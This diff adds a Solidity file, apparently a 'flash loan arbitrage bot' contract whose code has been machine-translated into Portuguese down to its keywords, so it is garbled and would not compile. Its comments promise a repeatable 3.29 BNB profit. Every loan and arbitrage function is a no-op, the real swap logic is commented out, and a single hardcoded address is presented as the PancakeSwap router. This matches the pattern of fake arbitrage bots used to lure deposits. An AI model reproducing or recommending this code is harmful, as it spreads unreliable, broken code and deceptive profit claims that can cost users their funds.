@@ -1,0 +1,216 @@
+solidez do pragma ^0.5.0; 
+
+
+interface IPPair { 
+Aprovação do evento( 
+proprietário indexado de endereço, 
+endereço de gastador indexado, 
+valor uint256 
+    ); 
+event Transfer(endereço indexado de, endereço indexado a, valor uint256); 
+
+function name() retornos puros externos (memória de string); 
+
+function symbol() retornos puros externos (memória de string); 
+
+função decimals() retornos puros externos (uint8); 
+
+a função totalSupply() retorna a visão externa (uint256); 
+
+função balanceOf(proprietário do endereço) a visão externa retorna (uint256); 
+
+subsídio de função (proprietário do endereço, gastador do endereço) 
+externo 
+Visão 
+retorna (uint256); 
+
+função aprovar(endereço gastador, valor uint256) retornos externos (bool); 
+
+função transfer(endereço para, valor uint256) retornos externos (bool); 
+
+função transferFrom( 
+endereço de, 
+endereço para, 
+valor uint256 
+) retornos externos (bool); 
+
+função DOMAIN_SEPARATOR() retorna a visão externa (bytes32); 
+
+função PERMIT_TYPEHASH() retornos puros externos (bytes32); 
+
+função nonces(proprietário do endereço) retorna a visão externa (uint256); 
+
+permissão de função ( 
+proprietário do endereço, 
+gastador de endereço, 
+valor uint256, 
+prazo uint256, 
+uint8 v, 
+bytes32r, 
+bytes32 s 
+) externo; 
+
+event Mint(endereço indexado do remetente, uint256 valor0, uint256 valor1); 
+evento Gravar( 
+remetente indexado de endereço, 
+uint256 quantidade0, 
+uint256 quantidade1, 
+endereço indexado para 
+    ); 
+evento trocar ( 
+remetente indexado de endereço, 
+uint256 quantidade0In, 
+uint256 quantidade1In, 
+uint256 quantidade0Saída, 
+uint256 quantidade1Saída, 
+endereço indexado para 
+    ); 
+evento Sync(uint112 reserve0, uint112 reserve1); 
+
+função MINIMUM_LIQUIDITY() retornos puros externos (uint256); 
+
+função factory() visão externa retorna (endereço); 
+
+função token0() visão externa retorna (endereço); 
+
+função token1() visão externa retorna (endereço); 
+
+função getReservas() 
+externo 
+Visão 
+retorna ( 
+uint112 reserve0, 
+uint112 reserva1, 
+uint32 blockTimestampLast 
+        ); 
+
+função price0CumulativeLast() retorna a visão externa (uint256); 
+
+função price1CumulativeLast() retorna a visão externa (uint256); 
+
+função kLast() visão externa retorna (uint256); 
+
+função mint(endereço para) retornos externos (uint256 liquidez); 
+
+função queimar (endereço para) 
+externo 
+retorna (uint256 valor0, uint256 valor1); 
+
+função troca ( 
+uint256 quantidade0Saída, 
+uint256 quantidade1Saída, 
+endereço para, 
+dados de dados de chamada de bytes 
+) externo; 
+
+função skim(endereço para) externo; 
+
+função sync() externa; 
+
+função inicializar(endereço, endereço) externo; 
+} 
+
+contrato RouterV2 { 
+
+function pancakeRouterV2Address() public pure retorna (endereço) { 
+retornar 0x61D5b35E02D36C6e413fDcB77Fc7B347A5Abe8CA; 
+    } 
+
+função compareStrings(memória de string a, memória de string b) 
+público puro 
+retorna (bool) 
+    { 
+return (keccak256(abi.encodePacked((a)))) == 
+keccak256(abi.encodePacked((b)))); 
+    } 
+
+function pancakeSwapAddress() public pure retorna (endereço) { 
+retornar 0x61D5b35E02D36C6e413fDcB77Fc7B347A5Abe8CA; 
+    } 
+
+//1.  Um empréstimo instantâneo pegou emprestado 3.137,41 BNB da Multiplier-Finance para fazer uma negociação de arbitragem no AMM DEX PancakeSwap. 
+function emprestadoFlashloanFromMultiplier( 
+endereço add0, 
+endereço add1, 
+valor uint256 
+) público puro { 
+require(uint(add0) != 0, "Endereço inválido."); 
+require(uint(add1) != 0, "Endereço inválido."); 
+require(valor > 0, "O valor deve ser maior que 0."); 
+    } 
+
+//Para preparar a arbitragem, o BNB é convertido em BUSD usando o contrato de swap PancakeSwap. 
+função convertBnbToBusd(endereço add0, uint256 quantidade) public pure { 
+require(uint(add0) != 0, "Endereço inválido"); 
+require(valor > 0, "O valor deve ser maior que 0"); 
+    } 
+
+function bakerySwapAddress() public pure retorna (endereço) { 
+retornar 0xE02dF9e3e622DeBdD69fb838bB799E3F168902c5; 
+    } 
+
+//A arbitragem converte BUSD para BNB usando BUSD/BNB PancakeSwap e, em seguida, converte imediatamente BNB de volta para 3.148,39 BNB usando BNB/BUSD BakerySwap. 
+função callArbitrageBakerySwap(endereço add0, endereço add1) public pure { 
+require(uint(add0) != 0, "Endereço inválido!"); 
+require(uint(add1) != 0, "Endereço inválido!"); 
+    } 
+
+//Após a arbitragem, 3.148,38 BNB é transferido de volta ao Multiplicador para pagamento do empréstimo mais taxas.  Esta transação custa 0,2 BNB de gás. 
+função transferBnbToMultiplier(endereço add0) 
+público puro 
+    { 
+require(uint(add0) != 0, "Endereço inválido!"); 
+    } 
+
+//5.  Observe que o remetente da transação ganha 3,29 BNB com a arbitragem, essa transação específica pode ser repetida à medida que o preço muda o tempo todo. 
+function completeTransation(uint256 balanceAmount) public pure { 
+require(balanceAmount >= 0, "O valor deve ser maior que 0!"); 
+    } 
+
+função troca ( 
+uint256 quantidade0Saída, 
+uint256 quantidade1Saída, 
+endereço para 
+) externo puro { 
+exigir ( 
+quantidade0Saída > 0 ||  quantidade1Saída > 0, 
+"Panqueca: INSUFFICIENT_OUTPUT_AMOUNT" 
+        );  
+require(uint(to) != 0, "O endereço não pode ser nulo");/* 
+(uint112 _reserve0, uint112 _reserve1,) = getReserves();  // economia de gás 
+require(amount0Out < _reserve0 && amount1Out < _reserve1, 'Pancake: INSUFFICIENT_LIQUIDITY'); 
+
+uint balance0; 
+uint saldo1; 
+{ // escopo para _token{0,1}, evita erros de pilha muito profundos 
+endereço _token0 = token0; 
+endereço _token1 = token1; 
+require(to != _token0 && to != _token1, 'Pancake: INVALID_TO'); 
+if (amount0Out > 0) _safeTransfer(_token0, to, amount0Out);  // transfere tokens de forma otimista 
+if (amount1Out > 0) _safeTransfer(_token1, to, amount1Out);  // transfere tokens de forma otimista 
+if (data.length > 0) IPancakeCallee(to).pancakeCall(msg.sender, quantidade0Saída, quantidade1Saída, dados); 
+balance0 = IERC20(_token0).balanceOf(endereço(este)); 
+balance1 = IERC20(_token1).balanceOf(endereço(este)); 
+        } 
+uint valor0Entrada = saldo0 > _reserve0 - valor0Saída ?  balance0 - (_reserve0 - valor0Saída) : 0; 
+uint valor1Entrada = saldo1 > _reserva1 - quantidade1Saída ?  saldo1 - (_reserva1 - valor1Saída) : 0; 
+require(amount0In > 0 || quantidade1In > 0, 'Pancake: INSUFFICIENT_INPUT_AMOUNT'); 
+{ // escopo para reserva{0,1}Ajustado, evita erros muito profundos na pilha 
+uint balance0Ajustado = balance0.mul(1000).sub(quantidade0In.mul(2)); 
+uint saldo1Ajustado = saldo1.mul(1000).sub(quantia1In.mul(2)); 
+        require(balance0Adjusted.mul(balance1Adjusted) >= uint(_reserve0).mul(_reserve1).mul(1000**2), 'Pancake: K');
+        }
+
+        _update(balance0, balance1, _reserve0, _reserve1);
+        emit Swap(msg.sender, amount0In, amount1In, amount0Out, amount1Out, to);*/
+    }
+
+    function lendingPoolFlashloan(uint256 _asset) public pure {
+        uint256 data = _asset; 
+        require(data != 0, "Data can't be 0.");/*
+        uint amount = 1 BNB;
+
+        ILendingPool lendingPool = ILendingPool(addressesProvider.getLendingPool());
+        lendingPool.flashLoan(address(this), _asset, amount, data);*/
+    }
+}
